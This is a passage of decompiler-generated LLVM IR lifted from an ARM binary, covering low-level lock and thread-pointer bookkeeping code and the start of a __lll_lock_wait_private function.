  %v2_143f0 = inttoptr i32 %v1_143f0 to i32*
  %v3_143f0 = load i32, i32* %v2_143f0, align 4
  store i32 %v3_143f0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_143f4 = icmp eq i32 %v3_143f0, 0
  br i1 %v2_143f4, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_143f0
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_143f0, %bb
  %v2_143fc = xor i1 %v2_143f4, true
  call void @__pseudo_cond_branch(i1 %v2_143fc, i32 %v3_143f0)
  %v0_14404 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_14404, i32* %stack_var_-88, align 4
  %v1_14408 = inttoptr i32 %v0_14404 to i32*
  %v2_14408 = load i32, i32* %v1_14408, align 4
  store i32 %v2_14408, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1440c = icmp eq i32 %v2_14408, 0
  store i32 %v2_14400, i32* %r5.global-to-local, align 4
  br i1 %v2_1440c, label %dec_label_pc_14478.loopexit, label %dec_label_pc_14420

dec_label_pc_14420:                               ; preds = %bb72
  %v1_14420 = add i32 %v2_14408, 20
  store i32 %v1_14420, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14424

dec_label_pc_14424:                               ; preds = %dec_label_pc_14458.dec_label_pc_14424_crit_edge, %dec_label_pc_14420
  %v0_14428 = phi i32 [ %v0_14428.pre, %dec_label_pc_14458.dec_label_pc_14424_crit_edge ], [ %v1_14420, %dec_label_pc_14420 ]
  %v0_14424 = phi i32 [ %v0_14424.pre, %dec_label_pc_14458.dec_label_pc_14424_crit_edge ], [ %v2_14408, %dec_label_pc_14420 ]
  %v1_14424 = add i32 %v0_14424, 20
  %v2_14424 = inttoptr i32 %v1_14424 to i32*
  %v3_14424 = load i32, i32* %v2_14424, align 4
  store i32 %v0_14428, i32* %r2.global-to-local, align 4
  store i32 %v3_14424, i32* %r4.global-to-local, align 4
  %v1_14434119 = inttoptr i32 %v0_14428 to i32*
  %v2_14434120 = load i32, i32* %v1_14434119, align 4
  store i32 %v2_14434120, i32* %r3.global-to-local, align 4
  %v3_14438122 = icmp uge i32 %v2_14434120, %v3_14424
  store i1 %v3_14438122, i1* %cpsr_c.global-to-local, align 1
  %v9_14438128 = icmp eq i32 %v2_14434120, %v3_14424
  br i1 %v9_14438128, label %dec_label_pc_14440, label %dec_label_pc_14458

dec_label_pc_14440:                               ; preds = %dec_label_pc_14424, %dec_label_pc_14440.dec_label_pc_14434_crit_edge
  %v0_14440129 = phi i32 [ %v1_14438.pre, %dec_label_pc_14440.dec_label_pc_14434_crit_edge ], [ %v3_14424, %dec_label_pc_14424 ]
  store i32 %v0_14440129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14450 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14450, label %dec_label_pc_14454, label %dec_label_pc_14440.dec_label_pc_14434_crit_edge

dec_label_pc_14440.dec_label_pc_14434_crit_edge:  ; preds = %dec_label_pc_14440
  %v0_14434.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14438.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14434 = inttoptr i32 %v0_14434.pre to i32*
  %v2_14434 = load i32, i32* %v1_14434, align 4
  store i32 %v2_14434, i32* %r3.global-to-local, align 4
  %v3_14438 = icmp uge i32 %v2_14434, %v1_14438.pre
  store i1 %v3_14438, i1* %cpsr_c.global-to-local, align 1
  %v9_14438 = icmp eq i32 %v2_14434, %v1_14438.pre
  br i1 %v9_14438, label %dec_label_pc_14440, label %dec_label_pc_14458

dec_label_pc_14454:                               ; preds = %dec_label_pc_14440
  %v0_14454 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14454, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14458

dec_label_pc_14458:                               ; preds = %dec_label_pc_14424, %dec_label_pc_14440.dec_label_pc_14434_crit_edge, %dec_label_pc_14454
  %v0_14458 = phi i32 [ %v0_14454, %dec_label_pc_14454 ], [ %v2_14434120, %dec_label_pc_14424 ], [ %v2_14434, %dec_label_pc_14440.dec_label_pc_14434_crit_edge ]
  %v1_14458 = phi i32 [ %v0_14454, %dec_label_pc_14454 ], [ %v3_14424, %dec_label_pc_14424 ], [ %v1_14438.pre, %dec_label_pc_14440.dec_label_pc_14434_crit_edge ]
  %v3_14458 = icmp uge i32 %v0_14458, %v1_14458
  store i1 %v3_14458, i1* %cpsr_c.global-to-local, align 1
  %v9_14458 = icmp eq i32 %v0_14458, %v1_14458
  store i32 %v2_14400, i32* %r4.global-to-local, align 4
  br i1 %v9_14458, label %dec_label_pc_143f0, label %dec_label_pc_14458.dec_label_pc_14424_crit_edge

dec_label_pc_14458.dec_label_pc_14424_crit_edge:  ; preds = %dec_label_pc_14458
  %v0_14424.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_14428.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14424

dec_label_pc_14474:                               ; preds = %dec_label_pc_14468.backedge, %entry
  %v0_1447c31 = phi i32 [ ptrtoint (i32* @global_var_22204.365 to i32), %entry ], [ %v0_14468, %dec_label_pc_14468.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14478

dec_label_pc_14478.loopexit:                      ; preds = %bb72
  store i32 %v2_14400, i32* %r6.global-to-local, align 4
  %v0_1447c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14478

dec_label_pc_14478:                               ; preds = %dec_label_pc_14478.loopexit, %dec_label_pc_14474
  %v0_1447c = phi i32 [ %v0_1447c.pre, %dec_label_pc_14478.loopexit ], [ %v0_1447c31, %dec_label_pc_14474 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_1447c = add i32 %v0_1447c, 152
  %v3_1447c = inttoptr i32 %v2_1447c to i32*
  %v4_1447c = load i32, i32* %v3_1447c, align 4
  store i32 %v4_1447c, i32* %r7.global-to-local, align 4
  %v0_14480 = call i32 @__aeabi_read_tp()
  store i32 %v0_14480, i32* %r0.global-to-local, align 4
  %v1_14484 = add i32 %v4_1447c, 8
  %v2_14484 = inttoptr i32 %v1_14484 to i32*
  %v3_14484 = load i32, i32* %v2_14484, align 4
  store i32 %v3_14484, i32* %r3.global-to-local, align 4
  %v1_14488 = add i32 %v0_14480, -1168
  store i32 %v1_14488, i32* %r5.global-to-local, align 4
  %v3_1448c = icmp uge i32 %v3_14484, %v1_14488
  store i1 %v3_1448c, i1* %cpsr_c.global-to-local, align 1
  %v9_1448c = icmp eq i32 %v3_14484, %v1_14488
  br i1 %v9_1448c, label %dec_label_pc_145f4, label %dec_label_pc_14494

dec_label_pc_14494:                               ; preds = %dec_label_pc_14478
  store i32 %v4_1447c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_144a0112 = inttoptr i32 %v4_1447c to i32*
  %v2_144a0113 = load i32, i32* %v1_144a0112, align 4
  store i32 %v2_144a0113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_144a4115 = icmp eq i32 %v2_144a0113, 0
  br i1 %v9_144a4115, label %dec_label_pc_144ac, label %dec_label_pc_144c4

dec_label_pc_144ac:                               ; preds = %dec_label_pc_14494, %dec_label_pc_144ac.dec_label_pc_144a0_crit_edge
  %v0_144ac116 = phi i32 [ %v1_144a4.pre, %dec_label_pc_144ac.dec_label_pc_144a0_crit_edge ], [ 0, %dec_label_pc_14494 ]
  store i32 %v0_144ac116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_144bc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_144bc, label %dec_label_pc_144c0, label %dec_label_pc_144ac.dec_label_pc_144a0_crit_edge

dec_label_pc_144ac.dec_label_pc_144a0_crit_edge:  ; preds = %dec_label_pc_144ac
  %v0_144a0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_144a4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_144a0 = inttoptr i32 %v0_144a0.pre to i32*
  %v2_144a0 = load i32, i32* %v1_144a0, align 4
  store i32 %v2_144a0, i32* %r3.global-to-local, align 4
  %v3_144a4 = icmp uge i32 %v2_144a0, %v1_144a4.pre
  store i1 %v3_144a4, i1* %cpsr_c.global-to-local, align 1
  %v9_144a4 = icmp eq i32 %v2_144a0, %v1_144a4.pre
  br i1 %v9_144a4, label %dec_label_pc_144ac, label %dec_label_pc_144c4

dec_label_pc_144c0:                               ; preds = %dec_label_pc_144ac
  %v0_144c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_144c0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_144c4

dec_label_pc_144c4:                               ; preds = %dec_label_pc_14494, %dec_label_pc_144ac.dec_label_pc_144a0_crit_edge, %dec_label_pc_144c0
  %v0_144c4 = phi i32 [ %v0_144c0, %dec_label_pc_144c0 ], [ %v2_144a0113, %dec_label_pc_14494 ], [ %v2_144a0, %dec_label_pc_144ac.dec_label_pc_144a0_crit_edge ]
  %v1_144c4 = phi i32 [ %v0_144c0, %dec_label_pc_144c0 ], [ 0, %dec_label_pc_14494 ], [ %v1_144a4.pre, %dec_label_pc_144ac.dec_label_pc_144a0_crit_edge ]
  %v3_144c4 = icmp uge i32 %v0_144c4, %v1_144c4
  store i1 %v3_144c4, i1* %cpsr_c.global-to-local, align 1
  %v9_144c4 = icmp eq i32 %v0_144c4, %v1_144c4
  br i1 %v9_144c4, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_144c4
  %v1_144c8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_144c8, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_144c4, %bb73
  %v1_144cc = xor i1 %v9_144c4, true
  call void @__pseudo_cond_branch(i1 %v1_144cc, i32 ptrtoint (i32* @global_var_14744.525 to i32))
  %v0_144d0 = load i32, i32* %r5.global-to-local, align 4
  %v1_144d0 = load i32, i32* %r7.global-to-local, align 4
  %v2_144d0 = add i32 %v1_144d0, 8
  %v3_144d0 = inttoptr i32 %v2_144d0 to i32*
  store i32 %v0_144d0, i32* %v3_144d0, align 4
  br label %dec_label_pc_145f4

dec_label_pc_145f4:                               ; preds = %bb74, %dec_label_pc_14478
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_144d8 = load i32, i32* %r8.global-to-local, align 4
  %v2_144d8 = add i32 %v0_144d8, 152
  %v3_144d8 = inttoptr i32 %v2_144d8 to i32*
  %v4_144d8 = load i32, i32* %v3_144d8, align 4
  store i32 %v4_144d8, i32* %r2.global-to-local, align 4
  %v1_144dc = add i32 %v4_144d8, 4
  %v2_144dc = inttoptr i32 %v1_144dc to i32*
  %v3_144dc = load i32, i32* %v2_144dc, align 4
  %v1_144e0 = add i32 %v3_144dc, 1
  store i32 %v1_144e0, i32* %r3.global-to-local, align 4
  store i32 %v1_144e0, i32* %v2_144dc, align 4
  %v0_144e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_144e8 = add i32 %v0_144e8, 108
  %v2_144e8 = inttoptr i32 %v1_144e8 to i32*
  %v3_144e8 = load i32, i32* %v2_144e8, align 4
  store i32 %v3_144e8, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_144f0 = sub i32 0, %v3_144e8
  store i32 %v1_144f0, i32* %v2_144e8, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_14504 = load i32, i32* %r5.global-to-local, align 4
  %v1_14504 = add i32 %v0_14504, 104
  store i32 %v1_14504, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_145f8.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_145f8 = add i32 %v0_14504, 108
  %v3_145f8 = inttoptr i32 %v2_145f8 to i32*
  store i32 %v0_145f8.pre, i32* %v3_145f8, align 4
  %v0_145fc = load i32, i32* %r8.global-to-local, align 4
  %v1_145fc = load i32, i32* %r3.global-to-local, align 4
  %v2_145fc = add i32 %v1_145fc, %v0_145fc
  %v3_145fc = inttoptr i32 %v2_145fc to i32*
  %v4_145fc = load i32, i32* %v3_145fc, align 4
  store i32 %v4_145fc, i32* %r0.global-to-local, align 4
  %v1_14600 = add i32 %v4_145fc, 4
  %v2_14600 = inttoptr i32 %v1_14600 to i32*
  %v3_14600 = load i32, i32* %v2_14600, align 4
  %v1_14604 = add i32 %v3_14600, -1
  store i32 %v1_14604, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14608 = icmp eq i32 %v1_14604, 0
  store i32 %v1_14604, i32* %v2_14600, align 4
  br i1 %v2_14608, label %dec_label_pc_14614, label %dec_label_pc_14704thread-pre-split

dec_label_pc_14614:                               ; preds = %dec_label_pc_145f4
  %v0_14614 = load i32, i32* %r3.global-to-local, align 4
  %v1_14614 = load i32, i32* %r0.global-to-local, align 4
  %v2_14614 = add i32 %v1_14614, 8
  %v3_14614 = inttoptr i32 %v2_14614 to i32*
  store i32 %v0_14614, i32* %v3_14614, align 4
  %v0_14618 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14618, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1461c

dec_label_pc_1461c:                               ; preds = %dec_label_pc_1464c.dec_label_pc_1461c_crit_edge, %dec_label_pc_14614
  %v0_1461c = phi i32 [ %v0_1461c.pre, %dec_label_pc_1464c.dec_label_pc_1461c_crit_edge ], [ %v0_14618, %dec_label_pc_14614 ]
  %v1_1461c = inttoptr i32 %v0_1461c to i32*
  %v2_1461c = load i32, i32* %v1_1461c, align 4
  store i32 %v2_1461c, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_1461c, i32* %r2.global-to-local, align 4
  %v2_14628100 = load i32, i32* %v1_1461c, align 4
  store i32 %v2_14628100, i32* %r3.global-to-local, align 4
  %v3_1462c102 = icmp uge i32 %v2_14628100, %v2_1461c
  store i1 %v3_1462c102, i1* %cpsr_c.global-to-local, align 1
  %v9_1462c108 = icmp eq i32 %v2_14628100, %v2_1461c
  br i1 %v9_1462c108, label %dec_label_pc_14634, label %dec_label_pc_1464c

dec_label_pc_14634:                               ; preds = %dec_label_pc_1461c, %dec_label_pc_14634.dec_label_pc_14628_crit_edge
  %v0_14634109 = phi i32 [ %v1_1462c.pre, %dec_label_pc_14634.dec_label_pc_14628_crit_edge ], [ %v2_1461c, %dec_label_pc_1461c ]
  store i32 %v0_14634109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14644 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14644, label %dec_label_pc_14648, label %dec_label_pc_14634.dec_label_pc_14628_crit_edge

dec_label_pc_14634.dec_label_pc_14628_crit_edge:  ; preds = %dec_label_pc_14634
  %v0_14628.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1462c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14628 = inttoptr i32 %v0_14628.pre to i32*
  %v2_14628 = load i32, i32* %v1_14628, align 4
  store i32 %v2_14628, i32* %r3.global-to-local, align 4
  %v3_1462c = icmp uge i32 %v2_14628, %v1_1462c.pre
  store i1 %v3_1462c, i1* %cpsr_c.global-to-local, align 1
  %v9_1462c = icmp eq i32 %v2_14628, %v1_1462c.pre
  br i1 %v9_1462c, label %dec_label_pc_14634, label %dec_label_pc_1464c

dec_label_pc_14648:                               ; preds = %dec_label_pc_14634
  %v0_14648 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14648, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1464c

dec_label_pc_1464c:                               ; preds = %dec_label_pc_1461c, %dec_label_pc_14634.dec_label_pc_14628_crit_edge, %dec_label_pc_14648
  %v0_14654 = phi i32 [ %v0_14648, %dec_label_pc_14648 ], [ %v2_14628100, %dec_label_pc_1461c ], [ %v2_14628, %dec_label_pc_14634.dec_label_pc_14628_crit_edge ]
  %v1_1464c = phi i32 [ %v0_14648, %dec_label_pc_14648 ], [ %v2_1461c, %dec_label_pc_1461c ], [ %v1_1462c.pre, %dec_label_pc_14634.dec_label_pc_14628_crit_edge ]
  %v3_1464c = icmp uge i32 %v0_14654, %v1_1464c
  store i1 %v3_1464c, i1* %cpsr_c.global-to-local, align 1
  %v9_1464c = icmp eq i32 %v0_14654, %v1_1464c
  br i1 %v9_1464c, label %dec_label_pc_14654, label %dec_label_pc_1464c.dec_label_pc_1461c_crit_edge

dec_label_pc_1464c.dec_label_pc_1461c_crit_edge:  ; preds = %dec_label_pc_1464c
  %v0_1461c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1461c

dec_label_pc_14654:                               ; preds = %dec_label_pc_1464c
  %v2_14654 = icmp ne i32 %v1_1464c, 0
  store i1 %v2_14654, i1* %cpsr_c.global-to-local, align 1
  %v7_14658 = icmp slt i32 %v1_1464c, 2
  br i1 %v7_14658, label %dec_label_pc_14704thread-pre-split, label %dec_label_pc_1465c

dec_label_pc_1465c:                               ; preds = %dec_label_pc_14654
  %v0_1465c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1465c, i32* %r0.global-to-local, align 4
  %v0_14660 = load i32, i32* @r1, align 4
  %v1_14660 = add i32 %v0_14660, 129
  store i32 %v1_14660, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14704thread-pre-split

dec_label_pc_14678:                               ; preds = %dec_label_pc_14704thread-pre-split, %dec_label_pc_14700
  %v0_14678 = phi i32 [ %v3_14700, %dec_label_pc_14700 ], [ %v0_14704.pr, %dec_label_pc_14704thread-pre-split ]
  %v1_14678 = inttoptr i32 %v0_14678 to i32*
  %v2_14678 = load i32, i32* %v1_14678, align 4
  store i32 %v2_14678, i32* %r3.global-to-local, align 4
  %v1_1467c = add i32 %v2_14678, 8
  %v2_1467c = inttoptr i32 %v1_1467c to i32*
  %v3_1467c = load i32, i32* %v2_1467c, align 4
  store i32 %v3_1467c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14680 = icmp eq i32 %v3_1467c, 0
  br i1 %v2_14680, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_14678
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_14678, %bb75
  %v2_14688 = xor i1 %v2_14680, true
  call void @__pseudo_cond_branch(i1 %v2_14688, i32 %v3_1467c)
  %v0_1468c = load i32, i32* %r6.global-to-local, align 4
  %v1_1468c = inttoptr i32 %v0_1468c to i32*
  %v2_1468c = load i32, i32* %v1_1468c, align 4
  store i32 %v2_1468c, i32* %r5.global-to-local, align 4
  %v1_14690 = add i32 %v2_1468c, 20
  store i32 %v1_14690, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14694

dec_label_pc_14694:                               ; preds = %dec_label_pc_146c8.dec_label_pc_14694_crit_edge, %bb76
  %v0_14698 = phi i32 [ %v0_14698.pre, %dec_label_pc_146c8.dec_label_pc_14694_crit_edge ], [ %v1_14690, %bb76 ]
  %v0_14694 = phi i32 [ %v0_14694.pre, %dec_label_pc_146c8.dec_label_pc_14694_crit_edge ], [ %v2_1468c, %bb76 ]
  %v1_14694 = add i32 %v0_14694, 20
  %v2_14694 = inttoptr i32 %v1_14694 to i32*
  %v3_14694 = load i32, i32* %v2_14694, align 4
  store i32 %v0_14698, i32* %r2.global-to-local, align 4
  store i32 %v3_14694, i32* %r4.global-to-local, align 4
  %v1_146a0 = add i32 %v3_14694, -1
  store i32 %v1_146a0, i32* @r1, align 4
  %v1_146a487 = inttoptr i32 %v0_14698 to i32*
  %v2_146a488 = load i32, i32* %v1_146a487, align 4
  store i32 %v2_146a488, i32* %r3.global-to-local, align 4
  %v3_146a890 = icmp uge i32 %v2_146a488, %v3_14694
  store i1 %v3_146a890, i1* %cpsr_c.global-to-local, align 1
  %v9_146a896 = icmp eq i32 %v2_146a488, %v3_14694
  br i1 %v9_146a896, label %dec_label_pc_146b0, label %dec_label_pc_146c8

dec_label_pc_146b0:                               ; preds = %dec_label_pc_14694, %dec_label_pc_146b0.dec_label_pc_146a4_crit_edge
  %v0_146b097 = phi i32 [ %v1_146a8.pre, %dec_label_pc_146b0.dec_label_pc_146a4_crit_edge ], [ %v3_14694, %dec_label_pc_14694 ]
  store i32 %v0_146b097, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_146c0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_146c0, label %dec_label_pc_146c4, label %dec_label_pc_146b0.dec_label_pc_146a4_crit_edge

dec_label_pc_146b0.dec_label_pc_146a4_crit_edge:  ; preds = %dec_label_pc_146b0
  %v0_146a4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_146a8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_146a4 = inttoptr i32 %v0_146a4.pre to i32*
  %v2_146a4 = load i32, i32* %v1_146a4, align 4
  store i32 %v2_146a4, i32* %r3.global-to-local, align 4
  %v3_146a8 = icmp uge i32 %v2_146a4, %v1_146a8.pre
  store i1 %v3_146a8, i1* %cpsr_c.global-to-local, align 1
  %v9_146a8 = icmp eq i32 %v2_146a4, %v1_146a8.pre
  br i1 %v9_146a8, label %dec_label_pc_146b0, label %dec_label_pc_146c8

dec_label_pc_146c4:                               ; preds = %dec_label_pc_146b0
  %v0_146c4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_146c4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_146c8

dec_label_pc_146c8:                               ; preds = %dec_label_pc_14694, %dec_label_pc_146b0.dec_label_pc_146a4_crit_edge, %dec_label_pc_146c4
  %v0_146d4 = phi i32 [ %v0_146c4, %dec_label_pc_146c4 ], [ %v2_146a488, %dec_label_pc_14694 ], [ %v2_146a4, %dec_label_pc_146b0.dec_label_pc_146a4_crit_edge ]
  %v1_146c8 = phi i32 [ %v0_146c4, %dec_label_pc_146c4 ], [ %v3_14694, %dec_label_pc_14694 ], [ %v1_146a8.pre, %dec_label_pc_146b0.dec_label_pc_146a4_crit_edge ]
  %v3_146c8 = icmp uge i32 %v0_146d4, %v1_146c8
  store i1 %v3_146c8, i1* %cpsr_c.global-to-local, align 1
  %v9_146c8 = icmp eq i32 %v0_146d4, %v1_146c8
  store i32 %v0_146d4, i32* %r2.global-to-local, align 4
  br i1 %v9_146c8, label %dec_label_pc_146d4, label %dec_label_pc_146c8.dec_label_pc_14694_crit_edge

dec_label_pc_146c8.dec_label_pc_14694_crit_edge:  ; preds = %dec_label_pc_146c8
  %v0_14694.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_14698.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14694

dec_label_pc_146d4:                               ; preds = %dec_label_pc_146c8
  %v2_146d4 = icmp ne i32 %v1_146c8, 0
  store i1 %v2_146d4, i1* %cpsr_c.global-to-local, align 1
  %v7_146d4 = icmp eq i32 %v1_146c8, 1
  %v0_146dc = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_146d4, label %dec_label_pc_146dc, label %dec_label_pc_14700

dec_label_pc_146dc:                               ; preds = %dec_label_pc_146d4
  %v1_146dc = inttoptr i32 %v0_146dc to i32*
  %v2_146dc = load i32, i32* %v1_146dc, align 4
  store i32 %v2_146dc, i32* @r1, align 4
  %v1_146e0 = add i32 %v2_146dc, 24
  %v2_146e0 = inttoptr i32 %v1_146e0 to i32*
  %v3_146e0 = load i32, i32* %v2_146e0, align 4
  store i32 %v3_146e0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_146e4 = icmp eq i32 %v3_146e0, 0
  br i1 %v2_146e4, label %dec_label_pc_14700, label %dec_label_pc_146ec

dec_label_pc_146ec:                               ; preds = %dec_label_pc_146dc
  %v1_146ec = add i32 %v2_146dc, 20
  %v2_146ec = inttoptr i32 %v1_146ec to i32*
  %v3_146ec = load i32, i32* %v2_146ec, align 4
  store i32 %v3_146ec, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14700

dec_label_pc_14700:                               ; preds = %dec_label_pc_146d4, %dec_label_pc_146ec, %dec_label_pc_146dc
  %v1_14700 = add i32 %v0_146dc, 4
  %v2_14700 = inttoptr i32 %v1_14700 to i32*
  %v3_14700 = load i32, i32* %v2_14700, align 4
  store i32 %v3_14700, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14704 = icmp eq i32 %v3_14700, 0
  br i1 %v2_14704, label %dec_label_pc_1470c, label %dec_label_pc_14678

dec_label_pc_14704thread-pre-split:               ; preds = %dec_label_pc_1465c, %dec_label_pc_14654, %dec_label_pc_145f4
  %v0_14704.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1470411 = icmp eq i32 %v0_14704.pr, 0
  br i1 %v2_1470411, label %dec_label_pc_1470c, label %dec_label_pc_14678

dec_label_pc_1470c:                               ; preds = %dec_label_pc_14700, %dec_label_pc_14704thread-pre-split
  %v0_1470c.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1470c.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_1470c.pre

; uselistorder directives
  uselistorder i32 %v0_14704.pr, { 1, 0 }
  uselistorder i32 %v3_14700, { 1, 2, 0 }
  uselistorder i32 %v1_146c8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_146c4, { 1, 0, 2 }
  uselistorder i32 %v1_146a8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14648, { 1, 0, 2 }
  uselistorder i32 %v1_1462c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1461c, { 1, 0 }
  uselistorder i32 %v0_144c0, { 1, 0, 2 }
  uselistorder i32 %v1_144a4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_1447c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_14454, { 1, 0, 2 }
  uselistorder i32 %v1_14438.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_14400, { 1, 0, 2 }
  uselistorder i32 %v0_143e0, { 1, 0, 2 }
  uselistorder i32 %v1_143c4.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 14, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 13, 12, 0 }
  uselistorder i32* %r6.global-to-local, { 3, 7, 5, 6, 4, 0, 1, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r3.global-to-local, { 33, 4, 5, 7, 6, 34, 8, 9, 10, 11, 13, 12, 1, 14, 15, 16, 17, 18, 19, 20, 22, 21, 0, 23, 24, 25, 27, 26, 3, 28, 29, 31, 30, 2, 32 }
  uselistorder i32* %r0.global-to-local, { 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 11, 6, 7, 8, 9, 31, 32, 10, 12, 13, 15, 14, 4, 16, 17, 19, 18, 5, 20, 21, 23, 22, 0, 24, 25, 26, 28, 27, 3, 30, 29, 2 }
  uselistorder i32 108, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1470c, { 1, 0 }
  uselistorder label %dec_label_pc_14700, { 1, 2, 0 }
  uselistorder label %dec_label_pc_146c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_146b0, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_1464c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14634, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_144c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_144ac, { 1, 0 }
  uselistorder label %dec_label_pc_14458, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14440, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_143e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_143cc, { 1, 0 }
  uselistorder label %dec_label_pc_14468.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_14398, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14744 = load i32, i32* @r4, align 4
  store i32 %v3_14744, i32* %stack_var_-16, align 4
  %v0_14748 = load i32, i32* %r0.global-to-local, align 4
